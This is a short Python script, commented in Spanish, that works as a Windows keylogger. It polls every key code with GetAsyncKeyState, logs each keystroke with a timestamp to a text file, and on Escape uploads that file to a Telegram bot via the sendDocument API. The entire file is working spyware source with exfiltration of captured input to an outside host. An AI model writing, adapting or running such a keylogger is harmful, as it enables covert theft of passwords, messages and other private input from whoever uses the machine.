import win32api
import win32con as wc
import time
from datetime import datetime
import requests
from dotenv import load_dotenv
import os

#se cargan las variables de entorno
load_dotenv()

token = str(os.environ["token"])
chat_id = str(os.environ["chat_id"])

#funcion para mandar el txt por tg
def mandar_tg(ruta):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(ruta, "rb") as archivo:
        requests.post(url, data={"chat_id":chat_id}, files={"document": archivo}, timeout=10)

#teclas especiales que no representan nada en texto
teclas_especiales = {
    wc.VK_RETURN: "[SALTO DE LINEA]",
    wc.VK_SHIFT: "[SHIFT]",
    wc.VK_TAB: "[TAB]",
    wc.VK_CONTROL: "[CRTL]",
    wc.VK_MENU: "[ALT]",
    wc.VK_CAPITAL: "[MAYUSCULAS]",
    wc.VK_PAUSE: "[PAUSA]",
    wc.VK_SPACE: " ",
    wc.VK_LEFT: "[FLECHA IZQUIERDA]",
    wc.VK_RIGHT: "[FLECHA DERECHA]",
    wc.VK_UP: "[FLECHA ARRIBA]",
    wc.VK_DOWN: "[FLECHA ABAJO]",
    wc.VK_DELETE: "[BORRAR]",
    wc.VK_F1: "[F1]",
    wc.VK_F2: "[2]",
    wc.VK_F3: "[F3]",
    wc.VK_F4: "[F4]",
    wc.VK_F5: "[F5]",
    wc.VK_F6: "[F6]",
    wc.VK_F7: "[F7]",
    wc.VK_F8: "[F8]",
    wc.VK_F9: "[F9]",
    wc.VK_F10: "[F10]",
    wc.VK_F11: "[F11]",
    wc.VK_F12: "[F12]",
    }

#se abre el archivo
archivo = open("registro.txt", "w", encoding="utf-8")
archivo.write("\n\n--- nuevo registro ---\n")
archivo.write(f"Inicio: {datetime.now()}\n\n")
archivo.flush()

#aca se guardan las teclas
tecla_presionada = set()

print("registrando...", flush=True)

#bucle que recorre la tecla presionada (su num) y devuelve su valor (letra o num) 
while True:
    for codigo in range(256):
        estado = win32api.GetAsyncKeyState(codigo)
        
        if estado & 0x0001:
            tecla_presionada.add(codigo)
            #si es la tecla esc se corta el code y se envia el txt
            if codigo == wc.VK_ESCAPE:
                print("cortando..")
                
                archivo.write("\n--- fin del registro ---\n")
                archivo.write(f"fin: {datetime.now()}\n")
                archivo.close()
                mandar_tg("registro.txt")
                
                exit()
            
            if codigo in teclas_especiales:
                tecla = teclas_especiales[codigo]
            
            elif 32 <= codigo <= 126:
                tecla = chr(codigo)
            
            else:
                continue
            momento = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            #aca se guarda la tecla presionada 
            linea = f"[{momento}] {tecla}\n"
            archivo.write(linea)
            archivo.flush()
    
    time.sleep(0.01)
